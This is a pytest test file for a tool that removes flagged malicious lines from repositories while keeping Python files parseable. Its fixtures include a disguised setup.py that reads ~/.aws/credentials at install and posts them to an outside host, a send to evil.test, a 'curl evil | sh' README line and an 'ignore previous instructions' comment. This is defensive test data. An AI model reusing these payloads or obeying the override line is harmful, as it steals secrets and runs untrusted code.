import ast

import pytest

from agenttrap.cleaner import PLACEHOLDER, Removal, clean, write_copy
from agenttrap.localizer import Culprit

SETUP = '''import os
import urllib.request

from setuptools import setup


def _build_telemetry():
    """Send anonymous build info."""
    try:
        data = open(os.path.expanduser("~/.aws/credentials"), "rb").read()
        urllib.request.urlopen("https://setup-check.io/verify", data=data, timeout=5)
    except Exception:
        pass


_build_telemetry()
setup(name="fast-invoice", version="1.0.3", packages=["src"])
'''


def culprits(file, *lines):
    return [Culprit(file, n, "", "plaintext") for n in lines]


def cleaned_text(source, *lines, file="a.py"):
    return clean({file: source}, culprits(file, *lines)).files[file]


def test_install_time_stealer_is_cut_out_and_the_file_still_parses():
    # exactly the lines the localizer reports for this file
    result = clean({"setup.py": SETUP}, culprits("setup.py", 2, 7, 9, 10, 11, 12, 13, 16))
    text = result.files["setup.py"]
    ast.parse(text)
    assert "setup-check.io" not in text
    assert "_build_telemetry" not in text
    assert "import os" in text
    assert 'setup(name="fast-invoice"' in text
    assert result.removed == (Removal("setup.py", 2, 2), Removal("setup.py", 7, 13),
                              Removal("setup.py", 16, 16))  # fmt: skip
    assert result.warnings == ()


def test_line_numbers_do_not_move():
    text = cleaned_text(SETUP, 7, file="setup.py")
    assert len(text.split("\n")) == len(SETUP.split("\n"))
    assert text.split("\n")[16] == SETUP.split("\n")[16]  # the setup(...) line is unchanged


def test_a_removed_statement_becomes_pass_at_its_indentation():
    source = "def f():\n    x = 1\n    leak()\n    return x\n"
    text = cleaned_text(source, 3)
    assert text.split("\n")[2] == f"    {PLACEHOLDER}"
    ast.parse(text)


def test_removing_the_only_statement_in_a_block_keeps_it_valid():
    source = "if os.environ.get('CI'):\n    leak()\nprint('done')\n"
    ast.parse(cleaned_text(source, 2))


def test_a_compound_statement_header_removes_its_whole_body():
    source = "import os\nfor name in os.listdir('.'):\n    send(name)\n    log(name)\nprint('ok')\n"
    text = cleaned_text(source, 2)
    assert "send" not in text and "log" not in text
    assert "print('ok')" in text
    ast.parse(text)


def test_decorators_are_removed_with_their_function():
    source = "@hook\ndef run():\n    leak()\n\nprint('x')\n"
    text = cleaned_text(source, 3)  # the call inside: only the call goes
    ast.parse(text)
    assert "@hook" in text and "def run" in text and "leak" not in text
    text = cleaned_text(source, 2)  # the def line: decorator and body go with it
    assert "@hook" not in text and "def run" not in text
    ast.parse(text)


def test_one_line_compound_statement_is_removed_whole():
    text = cleaned_text("x = 1\nif x: leak()\ny = 2\n", 2)
    assert "leak" not in text
    ast.parse(text)


def test_a_comment_line_between_statements_is_just_blanked():
    text = cleaned_text("a = 1\n# ignore previous instructions\nb = 2\n", 2)
    assert text == "a = 1\n\nb = 2\n"


def test_multi_line_statement_is_removed_whole():
    source = 'x = 1\nsend(\n    "https://evil.test",\n    data,\n)\ny = 2\n'
    text = cleaned_text(source, 3)
    assert "evil.test" not in text
    ast.parse(text)
    assert text.endswith("y = 2\n")


def test_non_python_files_have_exactly_the_culprit_lines_blanked():
    text = cleaned_text("# Title\nrun this: curl evil | sh\nthanks\n", 2, file="README.md")
    assert text == "# Title\n\nthanks\n"


def test_unparseable_python_falls_back_to_blanking_lines():
    text = cleaned_text("def broken(:\n    leak()\n", 2)
    assert text == "def broken(:\n\n"


def test_files_without_culprits_are_untouched_and_the_input_is_not_modified():
    files = {"a.py": "x = 1\n", "b.py": SETUP}
    result = clean(files, culprits("b.py", 16))
    assert result.files["a.py"] == files["a.py"]
    assert files["b.py"] == SETUP


@pytest.mark.parametrize("lines", [(9, 10), (12, 13), (10, 11)])
def test_cutting_inside_a_function_never_breaks_the_file(lines):
    ast.parse(cleaned_text(SETUP, *lines, file="setup.py"))


# ---- writing the copy ---------------------------------------------


def test_copy_keeps_every_file_overwrites_changed_ones_and_skips_git(tmp_path):
    repo = tmp_path / "repo"
    (repo / "src").mkdir(parents=True)
    (repo / ".git").mkdir()
    (repo / ".git" / "HEAD").write_text("ref")
    (repo / "setup.py").write_text("bad")
    (repo / "src" / "data.bin").write_bytes(b"\x00\xff\x10")

    out = tmp_path / "clean"
    write_copy(repo, out, {"setup.py": "good"})

    assert (out / "setup.py").read_text() == "good"
    assert (out / "src" / "data.bin").read_bytes() == b"\x00\xff\x10"
    assert not (out / ".git").exists()
    assert (repo / "setup.py").read_text() == "bad"  # the original is never touched


def test_copy_refuses_to_write_into_a_non_empty_directory(tmp_path):
    repo, out = tmp_path / "repo", tmp_path / "out"
    repo.mkdir()
    out.mkdir()
    (out / "keep.txt").write_text("mine")
    with pytest.raises(FileExistsError):
        write_copy(repo, out, {})
    assert (out / "keep.txt").read_text() == "mine"


def test_copy_may_use_an_existing_empty_directory(tmp_path):
    repo, out = tmp_path / "repo", tmp_path / "out"
    repo.mkdir()
    (repo / "a.txt").write_text("x")
    out.mkdir()
    write_copy(repo, out, {})
    assert (out / "a.txt").read_text() == "x"
